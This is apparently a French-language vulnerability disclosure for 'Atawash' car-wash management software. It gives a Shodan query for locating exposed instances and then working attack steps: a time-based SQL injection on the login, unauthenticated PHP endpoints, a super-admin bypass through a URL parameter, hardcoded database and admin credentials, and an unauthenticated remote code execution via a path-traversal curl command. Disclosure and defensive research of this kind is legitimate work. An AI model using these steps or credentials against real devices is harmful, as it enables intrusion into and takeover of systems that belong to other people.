![autowash-5th-element](https://github.com/Ug0Security/Atawash/assets/28728543/1dd4431c-3469-4514-9398-7ffa71aa71ef)

Je rentre de vacances et j'ai pas de mission..

shodan : http.favicon.hash:-991649870

--- SQLi sur le login mais time based on se fait chier ---

---------------------------------------------------------------
POST /index_connexion_atawa.php?resolution=1920x1080 HTTP/1.1
Host: xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: xx
Connection: close
Cookie: PHPSESSID=ww
Upgrade-Insecure-Requests: 1

login=test&pwd=test
------------------------------------------------------

--- Vlà les manques de controle d'accès sur les fichiers .php dont route sont décritent dans les fichiers js--- 

---------------------------------------------------------------
/choix/choix_version_svg.php?resolution=1920x1080
/config/configubuntu.php?resolution=1920x1080
...
---------------------------------------------------------------

--- Bypass auth super-admin (alors celle la..) ---

---------------------------------------------------------------
/systeme/super_administrateur.php?resolution=1920x1080 (oh lala besoin d'un mdp..)
/systeme/super_administrateur.php?resolution=1920x1080&code=ok (ah non c'est bon)
---------------------------------------------------------------

--- Hardcoded creds ---
---------------------------------------------------------------
/phpmyadminatawa/index.php (MySQL_Atawa:Atawa&13)
/systeme/super_administrateur.php (33310 - hardcoded dans le js..)
---------------------------------------------------------------

--- UnAuth RCE (ayayay vie d'ma mèrrrrrr)---

---------------------------------------------------------------
curl -F "script_name=../../../../../../../../../usr/bin/id" http://url:port/systeme/get_monitor_script.php
---------------------------------------------------------------
